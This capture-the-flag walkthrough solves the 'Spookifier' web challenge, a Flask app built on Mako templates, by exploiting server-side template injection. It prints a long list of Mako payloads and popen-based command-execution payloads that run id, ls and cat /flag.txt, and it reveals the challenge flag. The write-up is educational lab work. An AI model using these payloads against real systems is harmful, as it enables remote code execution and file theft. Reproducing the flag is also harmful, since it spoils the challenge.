
SPOOKIFIER is an innovative tool that brings a touch of fright and fun to your digital content. It's perfect for creating themed content, particularly around occasions like Halloween. With SPOOKIFIER, you can effortlessly transform your ordinary texts and graphics into spooky versions filled with ghostly charm. Get ready to spook your audience and bring a unique, eerie vibe to your digital creations.

**Room Description:** There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

![[1.png]]

[spookifier.zip](https://prod-files-secure.s3.us-west-2.amazonaws.com/d31c7c8c-5aa6-4285-9c64-ce0800706c95/9b7049c5-512e-4bf3-a3f2-a541429e1e2b/spookifier.zip)

Downloading the zip file, It has the following contents

![[2.png]]

By going through the docker file , we can understand that we are installing flask_mako

> **Flask-Mako** is a powerful tool for web developers working with Flask, a popular web framework in Python. As an extension, Flask-Mako serves as a bridge between Flask and the Mako templating engine. The Mako templating engine is designed to be fast and highly flexible, which makes it an excellent choice for generating dynamic HTML content. It offers the advantage of cleaner syntax compared to other templates and allows for complex templating scenarios. By using Flask-Mako, developers can use Mako's syntax and functionality within their Flask applications. This includes features like template inheritance, filters, and the ability to embed raw Python code within templates. Moreover, Flask-Mako also facilitates easy management of static files such as CSS and JavaScript, which are crucial elements of any modern web application. In a nutshell, Flask-Mako brings the power and flexibility of Mako to Flask, making it simpler for developers to create dynamic, feature-rich web applications

![[3.png]]

Going through other files

![[4.png]]

Config:

![[5.png]]

Challenges application/blueprints/routes.py

![[6.png]]

The static directory consisted of web template and all

![[7.png]]

There is a main code in apllication

```python
from flask import Flask, jsonify
from application.blueprints.routes import web
from flask_mako import MakoTemplates

app = Flask(__name__)
MakoTemplates(app)

def response(message):
    return jsonify({'message': message})

app.register_blueprint(web, url_prefix='/')

@app.errorhandler(404)
def not_found(error):
    return response('404 Not Found'), 404

@app.errorhandler(403)
def forbidden(error):
    return response('403 Forbidden'), 403

@app.errorhandler(400)
def bad_request(error):
    return response('400 Bad Request'), 400

```

After going through lines of code , we can see tha6t everything goes through blueprint

Now lets pay the site a little visit.

![[8.png]]

Just for fun i entered name : wayne and here is the output I got

![[9.png]]

performing little recon on mako it shows that its vulnerable to serverside template injection

![[10.png]]


So trying a sstl payload to check

”{{6*6}}”

![[11.png]]

let’s try some available sstl payloads

Before executing the payload , I tried retrieving the self object

![[12.png]]

![[13.png]]

```bash
${self.module.cache.util.os.system("id")}
${self.module.runtime.util.os.system("id")}
${self.template.module.cache.util.os.system("id")}
${self.module.cache.compat.inspect.os.system("id")}
${self.**init**.**globals**['util'].os.system('id')}
${self.template.module.runtime.util.os.system("id")}
${self.module.filters.compat.inspect.os.system("id")}
${self.module.runtime.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.util.os.system("id")}
${self.template.**init**.**globals**['os'].system('id')}
${self.module.cache.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.util.os.system("id")}
${self.template.module.cache.compat.inspect.os.system("id")}
${self.module.cache.compat.inspect.linecache.os.system("id")}
${self.template._mmarker.module.runtime.util.os.system("id")}
${self.attr._NSAttr__parent.module.cache.util.os.system("id")}
${self.template.module.filters.compat.inspect.os.system("id")}
${self.template.module.runtime.compat.inspect.os.system("id")}
${self.module.filters.compat.inspect.linecache.os.system("id")}
${self.module.runtime.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.exceptions.util.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.util.os.system("id")}
${self.context._with_template.module.cache.util.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.template.module.cache.util.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.util.os.system("id")}
${self.module.cache.util.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.util.compat.inspect.os.system("id")}
${self.module.runtime.util.compat.inspect.linecache.os.system("id")}
${self.module.runtime.exceptions.traceback.linecache.os.system("id")}
${self.module.runtime.exceptions.util.compat.inspect.os.system("id")}
${self.template._mmarker.module.cache.compat.inspect.os.system("id")}
${self.template.module.cache.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.cache.util.os.system("id")}
${self.template._mmarker.module.filters.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.cache.compat.inspect.os.system("id")}
${self.template._mmarker.module.runtime.exceptions.util.os.system("id")}
${self.template.module.filters.compat.inspect.linecache.os.system("id")}
${self.template.module.runtime.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.template.module.runtime.util.os.system("id")}
${self.context._with_template._mmarker.module.cache.util.os.system("id")}
${self.template.module.runtime.exceptions.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.filters.compat.inspect.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.cache.compat.inspect.os.system("id")}
${self.module.runtime.exceptions.compat.inspect.linecache.os.system("id")}
${self.attr._NSAttr__parent.module.runtime.exceptions.util.os.system("id")}
${self.context._with_template._mmarker.module.runtime.util.os.system("id")}
${self.context._with_template.module.filters.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.compat.inspect.os.system("id")}
${self.context._with_template.module.runtime.exceptions.util.os.system("id")}
${self.template.module.runtime.exceptions.traceback.linecache.os.system("id")}
```

Capture the packet using Burpsuite and send to repeater

![[14.png]]


Now use the payloads

![[16.png]]

It just gave response with exit code “0”

Since the above payloads returned nothing , lets try popen

The code is available in [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako)

```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

Now enter this in payload of burp packet

```bash
<%+x=self.module.runtime.util.os.popen('id').read()+%>${x}
```

Once you enter this you should be able to see the details of uid,gid , groups of the engine like the following

Now alter the above to list the directories

![[17.png]]

Now alter the above like the following to list the directories

```bash
<%+x=self.module.runtime.util.os.popen('ls+-l').read()+%>${x}
```

![[18.png]]

Now , since flag is located in the same directory

alter the above payload into

```bash
<%+x=self.module.runtime.util.os.popen('cat+/flag.txt').read()+%>${x}
```

![[19.png]]

<details>
  <summary>Click to reveal the Flags</summary>
  Flag: HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!}
</details>


![[20.png]]

**Conclusion**

The Spookifier lab is a beginner-friendly challenge that effectively demonstrates the basics of template injection exploitation. The walkthrough showcased the process clearly, making it ideal for practicing and understanding this common web application vulnerability. The room focuses more on identifying the vulnerability and crafting the payload rather than complex post-exploitation techniques.

- Exploiting a template injection vulnerability in a Flask application.
- Executing arbitrary code on the system using the vulnerability.
- Utilizing the `os.popen()` function to access and read the flag file.